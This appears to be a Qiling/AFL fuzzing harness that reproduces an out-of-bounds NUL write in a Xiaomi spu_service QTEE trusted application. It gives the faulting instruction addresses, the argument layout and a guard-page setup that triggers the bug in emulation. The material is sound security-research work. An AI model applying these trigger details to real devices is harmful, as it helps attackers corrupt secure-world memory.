from .params import *
from qiling import Qiling
import struct, os

# === spu_service Finding-A reproduction: method-0 OOB NUL write ==============
# Target: Xiaomi houji spu_service.ta (SPU bridge / KM provisioning QTEE TA).
#
# Staging (spu_service.json): GP lifecycle stubbed (returns TEE_SUCCESS);
# InvokeCommand points DIRECTLY at the app Mink dispatcher process_invoke@0x558.
#   ABI: x0 = object/session ctx, w1 = method id (<=0xf), x2 = ObjectArg[] (an
#        array of 16-byte {ptr,size} slots), w3 = ObjectCounts/paramTypes word.
#
# Method 0 (spu_create_km_provision_device_id_cmd, requires w3==8 = "8 input
# buffers") reads 8 {ptr,size} slots and, for the device-ID string params,
# does at 0x318c:
#   0x3284 ldr  x8, [x29,#0x88]      ; x8 = a param's NW-supplied SIZE
#   0x3288 cbz  x8, skip             ; ONLY guard: skip if size==0
#   0x329c strb wzr, [x0, x8]        ; *(param_ptr + size) = '\0'   <-- OOB
# (second identical sink at 0x33b8). There is NO `size < capacity` check; the
# write lands one byte past a tightly-mapped NW buffer.
#
# DETECTION: we map each device-ID param buffer so it ENDS EXACTLY at a page
# boundary, with the NEXT page UNMAPPED (a guard page). With param.size == the
# mapped length, `buf[size]` writes into the guard page -> UC_ERR_WRITE_UNMAPPED
# (errno 7) -> crash_validation returns True -> AFL crash. This faithfully models
# the OOB (cmnlib maps exactly `len` bytes for a tightly-sized string memref).
#
# The crash address (the faulting strb) and x0/x8 show the attacker ptr+len.

AFL_EXIT = 0x13370
METHOD_PROVISION = 0          # method 0 -> spu_create_km_provision_device_id_cmd
COUNTS_8 = 8                  # w3 must == 8

# ObjectArg[] : 8 slots * 16 bytes = 0x80
ARG_BASE   = 0x55000000
ARG_SIZE   = 0x1000

# Param-buffer pool: each device-ID buffer is placed so it ends right before a
# guard page. We carve 8 buffers, one per slot, each in its own 2-page cell:
#   cell k: [PBUF_BASE + k*0x2000 .. +0x1000) mapped, [+0x1000 .. +0x2000) UNMAPPED.
# The buffer is the LAST `blen` bytes of the mapped page so buf+blen == guard.
PBUF_BASE  = 0x56000000
CELL       = 0x2000           # mapped page + guard page
PAGE       = 0x1000

# default param size: the OOB triggers for ANY size>0 whose buf+size hits the
# guard. We place the buffer so its end == page end, so size == blen.
DEFAULT_LEN = int(os.environ.get("SPU_LEN", str(0x20)), 0) & 0xFFFFFFFF


def _buf_addr(k, blen):
    # buffer occupies [page_end-blen, page_end); guard page starts at page_end.
    page_end = PBUF_BASE + k * CELL + PAGE
    return page_end - blen


def init_fuzz(emu, sid):
    ql = emu.ql
    try:
        ql.mem.map(ARG_BASE, ARG_SIZE, info="[spu] objargs")
    except Exception as e:
        ql.log.warning(f"[spu] map argbase: {e}")
    # map ONLY the first page of each cell -> second page is the guard.
    for k in range(8):
        try:
            ql.mem.map(PBUF_BASE + k * CELL, PAGE, info=f"[spu] pbuf{k}")
        except Exception as e:
            ql.log.warning(f"[spu] map pbuf{k}: {e}")
    print(f"[spu] init: args@{hex(ARG_BASE)} pbufs@{hex(PBUF_BASE)} (guard page after each)")


def _build_args(blen):
    """8 slots; each slot {ptr=guard-aligned buffer, size=blen}. All 8 carry a
    device-ID string so whichever slot reaches the sink first, buf[blen] faults
    on its guard page."""
    a = bytearray(0x80)
    for k in range(8):
        ptr = _buf_addr(k, blen)
        struct.pack_into("<Q", a, k * 16 + 0, ptr)
        struct.pack_into("<Q", a, k * 16 + 8, blen & 0xFFFFFFFF)
    return bytes(a)


def place_input_callback(ql: Qiling, input: bytes, _: int):
    # AFL drives the param size; size 0 is the safe (cbz-skipped) case, any
    # size in (0, PAGE] places the NUL write at buf[size] on the guard page.
    blen = DEFAULT_LEN
    if "SPU_LEN" not in os.environ:
        v = struct.unpack_from("<I", input, 0)[0] if len(input) >= 4 else 0
        blen = v % (PAGE + 1)               # 0..0x1000

    # fill each buffer with non-NUL bytes (so it looks like a real string) up to
    # blen; the buffer's last byte sits at page_end-1, so buf[blen] == guard[0].
    for k in range(8):
        if blen > 0:
            ptr = _buf_addr(k, blen)
            ql.mem.write(ptr, b"A" * blen)
    ql.mem.write(ARG_BASE, _build_args(blen))

    setup_params_fuzz(ql, METHOD_PROVISION, 0, [NoneParam(), NoneParam(), NoneParam(), NoneParam()])

    # process_invoke(x0=ctx, w1=method, x2=ObjectArg[], w3=counts)
    ql.arch.regs.x0 = ARG_BASE + 0x800        # a benign ctx (refcount area, far from args)
    ql.arch.regs.x1 = METHOD_PROVISION
    ql.arch.regs.x2 = ARG_BASE
    ql.arch.regs.x3 = COUNTS_8
    ql.arch.regs.x30 = AFL_EXIT

    print(f"[spu] method=0 provision, 8 device-id bufs size={blen:#x} "
          f"-> strb wzr,[buf+{blen:#x}] (OOB into guard when blen>0)")
    return True
